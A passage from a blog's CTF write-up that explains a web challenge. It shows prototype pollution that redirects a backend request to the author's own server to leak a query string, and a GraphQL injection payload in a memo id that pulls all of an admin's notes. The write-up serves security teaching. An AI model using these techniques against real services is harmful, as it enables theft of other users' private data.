app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> origPath <span class="token operator">=</span> req<span class="token punctuation">.</span>originalUrl<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">let</span> origParam <span class="token operator">=</span> req<span class="token punctuation">.</span>originalUrl<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">let</span> langPath <span class="token operator">=</span> <span class="token string">'en/'</span>
    
  
    <span class="token keyword">if</span> <span class="token punctuation">(</span>origPath<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">((\/en\/?)|(\/ja\/?))$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span> <span class="token operator">||</span> origPath<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^(\/static\/|\/graphql\/?|\/favicon.ico\/?)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'accept-language'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'accept-language'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'ja'</span><span class="token punctuation">)</span> langPath <span class="token operator">=</span> <span class="token string">'ja/'</span>
      res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span>origPath <span class="token operator">+</span> <span class="token punctuation">(</span>origPath<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">''</span> <span class="token operator">:</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">+</span> langPath <span class="token operator">+</span> <span class="token punctuation">(</span>origParam <span class="token operator">?</span> <span class="token string">'?'</span> <span class="token operator">+</span> origParam <span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Note that <code>req.originalUrl</code> will only have the path part, so if it’s like <a target="_blank" rel="noopener" href="http://chall:11005/abc">http://chall:11005/abc</a>, the originalUrl will be <code>/abc</code>.</p>
<p>With the path manipulated above, we can pollute the path to <code>/huli.tw/</code>, so the sent URL will be: <code>http://34.85.126.119:11005//huli.tw/?extensions=...</code>, and in the backend’s redirect logic, it will finally be redirected to <code>//huli.tw/en/?extension=...</code>.</p>
<p>This way, by using prototype pollution, the request can be redirected to our own server and the query string can be obtained.</p>
<p>The goal of this challenge is to steal the admin’s memo, but we don’t know the admin memo id. What should we do?</p>
<p>Take a closer look at this section:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">memo</span><span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> query <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">query &#123; 
        memo (
            id: "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">", 
            token: "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>token<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">") &#123;
                content
            &#125; 
        &#125;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">#query</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>We can carefully construct an id to achieve GraphQL injection, like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">query <span class="token punctuation">&#123;</span> 
  <span class="token function">memo</span> <span class="token punctuation">(</span>
    <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token literal-property property">token</span><span class="token operator">:</span> <span class="token string">"b"</span>
  <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> content <span class="token punctuation">&#125;</span>

  <span class="token literal-property property">memo2</span><span class="token operator">:</span> <span class="token function">memos</span><span class="token punctuation">(</span>
    <span class="token literal-property property">token</span><span class="token operator">:</span> <span class="token string">"$&#123;this.token&#125;"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        content
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>This turns into two queries. The original memo token becomes the memos token, allowing access to all admin notes.</p>
<p>Therefore, the final solution is to send this modified query once to let the server store the result, then add prototype pollution to redirect the request to our server. This way, we can find out the hash and obtain the result.</p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2023/04/14/en/how-to-prepare-japan-fe-and-sg-exam/">Preparation Experience for Japan&#39;s FE and SG Exams for Zero-Day Japanese Beginners</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2023/03/26/en/dicectf-2023-writeup/">DiceCTF 2023 Notes</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2026 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2023/03/27/linectf-2023-writeup/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>